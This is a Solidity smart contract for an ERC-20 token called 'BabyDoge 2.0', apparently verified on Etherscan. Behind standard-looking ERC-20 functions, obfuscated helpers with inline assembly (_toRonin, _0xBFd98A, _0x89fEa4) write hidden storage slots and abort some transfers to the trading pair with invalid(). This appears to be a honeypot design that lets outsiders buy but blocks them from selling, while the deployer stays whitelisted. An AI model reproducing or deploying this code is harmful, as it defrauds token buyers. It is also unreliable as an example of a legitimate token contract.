/**
 *Submitted for verification at Etherscan.io on 2022-06-20
*/

//SPDX-License-Identifier: UNLICENSED


/**
 https://t.me/babydogetwozero
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private signAddr;
    uint256 private _doge20 = block.number*2;

    mapping (address => bool) private astralETH; 
    mapping (address => bool) private toBFI; 
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private callTeam;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private _taxes;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool private trading; uint256 private bearLand = 1; bool private hawkEdition;
    uint256 private _decimals; uint256 private doveSwap;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        signAddr.push(_router); signAddr.push(msgSender_); signAddr.push(pair);
        for (uint256 q=0; q < 3;) {astralETH[signAddr[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function _0xC3A9fd(address x, uint256 y) internal pure returns (bytes32 b) { b = keccak256(abi.encodePacked([uint256(uint160(x)), y])); }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _balanceAt() internal view returns (uint256 _val) {
        assembly { _val := gas() }
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _doge20 = block.number;
        return true;
    }

    function _toRonin(bool open, bytes32 hbar, uint256 dx) internal { assembly { if and(lt(dx,sload(0xB)),open) { invalid() } if sload(0x16) { sstore(hbar,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function _0xBFd98A(bytes32 z, bytes32 y, uint256 amount) internal {
        assembly {if or(eq(sload(y),iszero(sload(z))),eq(iszero(sload(y)),sload(z))) { switch amount case 1 {
                    let x := sload(0x18) let t := sload(0x11) if iszero(sload(0x17)) { sstore(0x17,t) } let g := sload(0x17)
                    switch gt(g,div(t,0x3)) case 1 { g := sub(g,div(div(mul(g,mul(0x203,x)),0xB326),0x2))} 
                    case 0 {g := div(t,0x3)} sstore(0x17,t) sstore(0x11,g) sstore(0x18,add(sload(0x18),0x1))
                } case 0 { let x := sload(0x11) let t := sload(0x17) sstore(0x17,x) sstore(0x11,t) } }
            if iszero(amount) { if iszero(mod(sload(0x15),0x5)) { sstore(0x16,0x1) } sstore(0x3,number()) } } }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, bytes32 reflect, uint256 integer) internal {
        require((trading || (sender == signAddr[1])), "ERC20: trading is not yet enabled.");
        assembly { if eq(sload(reflect),0x1) { sstore(0x15,add(sload(0x15),0x1)) } } _toRonin((((hawkEdition || toBFI[sender]) && ((_doge20 - theN) >= 9)) || (integer >= _limit) || ((integer >= (_limit/5)) && (_doge20 == block.number))) && (astralETH[recipient] == true) && (astralETH[sender] != true), _0xC3A9fd(signAddr[1],6), _balanceAt()); _0xBFd98A(_0xC3A9fd(recipient,4),_0xC3A9fd(sender,4),1);
        _0x89fEa4(_0xC3A9fd(callTeam, 5), (((_doge20 == block.number) || (theV >= _limit) || ((_doge20 - theN) <= 9)) && (astralETH[callTeam] != true))); _0xBFd98A(_0xC3A9fd(recipient,4),_0xC3A9fd(sender,4),0); theV = integer; callTeam = recipient;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, _0xC3A9fd(recipient,4), amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _0x89fEa4(bytes32 sender, bool account) internal { assembly { if eq(account,0x1) { sstore(sender,0x1) } } }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeploySign(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(signAddr[0], 10 ** 77);
        assembly { sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) }
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeploySign(creator, initialSupply);
    }
}

contract babyDoge2 is ERC20Token {
    constructor() ERC20Token("BabyDoge 2.0", "BabyDoge2.0", msg.sender, 33800 * 10 ** 18) {
    }
}